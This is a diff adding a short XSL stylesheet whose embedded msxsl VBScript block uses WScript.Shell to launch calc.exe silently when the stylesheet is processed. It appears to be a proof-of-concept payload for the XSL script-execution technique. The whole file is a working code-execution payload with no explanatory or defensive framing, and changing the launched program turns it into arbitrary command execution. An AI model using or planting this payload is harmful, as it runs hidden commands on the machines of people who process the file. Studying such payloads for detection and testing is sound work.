@@ -1,0 +1,17 @@
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="urn:my-scripts">
+
+<msxsl:script language="VBScript" implements-prefix="user">
+function myFunction()
+set shell=createobject("wscript.shell")
+shell.run "calc.exe",0
+myFunction = 0
+end function
+
+</msxsl:script>
+<xsl:template match="/">
+<xsl:value-of select="user:myFunction()"/>
+</xsl:template>
+</xsl:stylesheet>
